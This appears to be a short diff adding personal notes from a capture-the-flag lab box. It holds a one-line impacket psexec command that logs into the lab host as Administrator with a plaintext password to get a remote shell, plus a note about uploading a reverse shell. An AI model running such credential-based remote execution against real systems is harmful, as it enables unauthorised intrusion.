@@ -1,0 +1,3 @@
+upload reverse using creds in windows 
+
+psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
